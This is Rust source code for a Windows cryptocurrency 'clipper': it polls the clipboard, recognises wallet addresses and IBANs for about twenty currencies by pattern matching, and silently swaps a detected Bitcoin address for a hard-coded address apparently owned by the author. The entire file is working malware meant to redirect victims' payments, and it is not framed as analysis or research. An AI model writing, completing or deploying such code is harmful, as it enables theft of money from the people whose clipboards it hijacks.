use regex::Regex;

// sry for awful code lol coded this a while ago

use once_cell::sync::OnceCell;
use std::{collections::HashMap, sync::Mutex};

use winapi::um::winbase::GlobalSize;
use winapi::um::winbase::{GlobalAlloc, GlobalFree, GlobalLock, GlobalUnlock, GMEM_MOVEABLE};
use winapi::um::winuser::{
    CloseClipboard, GetClipboardData, OpenClipboard, SetClipboardData, CF_UNICODETEXT,
};

use clipboard_win::get_clipboard;
use clipboard_win::Getter;
use clipboard_win::{formats, set_clipboard, set_clipboard_string};
fn copy_to_clipboard(text: &str) {
    // thx stackoverflow :joy:

    println!("{} - {}", text, text.len());
    let err = set_clipboard_string(text);
    if err.is_ok() {
        println!("{}", err.is_ok());
    }
}

pub fn get() -> Option<String> {
    let mut clipboard: Result<String, _> = get_clipboard(formats::Unicode);

    if clipboard.is_ok() {
        return Some(clipboard.unwrap());
    } else {
        return None;
    }
}

pub fn clipper() {
    let mut prev_content = String::new();
    let mut clipboard: String = String::new();

    loop {
        let result = get();

        if result.is_some() {
            clipboard = result.unwrap();

            if !(clipboard == prev_content) {
                prev_content = clipboard.clone();

                // User has copied something new
                let has_addr = has_address(&clipboard);

                if has_addr.len() > 0 {
                    let addr = replace_address(has_addr);
                }
            }
        } else {
            std::thread::sleep(std::time::Duration::from_millis(1000)); // sleep longer if error
        }

        std::thread::sleep(std::time::Duration::from_millis(250));
    }
}

fn replaced() -> &'static Mutex<HashMap<&'static str, &'static str>> {
    static INSTANCE: OnceCell<Mutex<HashMap<&'static str, &'static str>>> = OnceCell::new();
    INSTANCE.get_or_init(|| {
        let mut hm = HashMap::new();
        hm.insert("XMR", "");
        hm.insert("BNB", "");
        hm.insert("TRX", "");
        hm.insert("ETH", "");
        hm.insert("BTC", "17CoSbqEDELfNjUx2i6GrAm3tzfw7ggfAf");
        hm.insert("DOGE", "");
        hm.insert("BCH", "");
        hm.insert("LTC", "");
        hm.insert("DASH", "");
        hm.insert("XRP", "");
        hm.insert("ADA", "");
        hm.insert("TON", "");
        hm.insert("NEO", "");
        hm.insert("ETC", "");
        hm.insert("SOL", "");
        hm.insert("ZEC", "");
        hm.insert("ALGO", "");
        hm.insert("XLM", "");
        hm.insert("IBAN", "");
        Mutex::new(hm)
    })
}

pub fn replace_address(crypto: &str) -> String {
    if replaced().lock().unwrap().get(crypto).unwrap().len() < 1 {
        return String::new();
    }

    let _ = copy_to_clipboard(replaced().lock().unwrap().get(crypto).unwrap());
    crypto.to_string()
}

pub fn has_address(address: &str) -> &str {
    if address.len() == 95 && address.chars().next().unwrap() == '4' {
        return "XMR";
    }

    if address.len() == 42 && address.starts_with("bnb1") {
        return "BNB";
    }

    if address.len() == 34 && address.chars().next().unwrap() == 'T' {
        return "TRX";
    }

    if address.len() == 42 && address.starts_with("0x3f") {
        return "ETC";
    }

    if address.len() == 42 && address.starts_with("0x") {
        return "ETH";
    }

    if address.len() == 35 && address.starts_with("t1") {
        return "ZEC";
    }

    if (address.len() == 42 && address.starts_with("bc1"))
        || (address.len() == 34 && address.starts_with("1"))
        || (address.len() == 34 && address.starts_with("3"))
    {
        return "BTC";
    }

    if (address.len() == 48) && (address.contains("-") || address.contains("_")) {
        return "TON";
    }

    if address.len() == 58 && Regex::new("[A-Z2-7]{58}").unwrap().is_match(address) {
        return "ALGO";
    }

    if address.len() == 56
        && address.starts_with("G")
        && Regex::new("[A-Z2-7]{58}")
            .unwrap()
            .is_match(&(address.to_owned() + "AA"))
    {
        return "XLM";
    }

    let mut regexes = HashMap::new();
    regexes.insert("DOGE", "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$");
    regexes.insert("BCH", "^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$");
    regexes.insert("LTC", "(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)");
    regexes.insert("DASH", "^X[1-9A-HJ-NP-Za-km-z]{33}$");
    regexes.insert("XRP", r"\br[0-9a-zA-Z]{24,34}\b");
    regexes.insert("ADA", "^D[A-NP-Za-km-z1-9]{35,}$");
    regexes.insert("NEO", "(?:^A[0-9a-zA-Z]{33}$)");
    regexes.insert("SOL", "(^[1-9A-HJ-NP-Za-km-z]{32,44}$)");
    regexes.insert(
        "IBAN",
        "[a-zA-Z]{2}[0-9]{2}[a-zA-Z0-9]{4}[0-9]{7}([a-zA-Z0-9]?){0,16}",
    );

    for (coin, regex) in regexes.iter() {
        if Regex::new(regex).unwrap().is_match(address) {
            return coin;
        }
    }

    ""
}
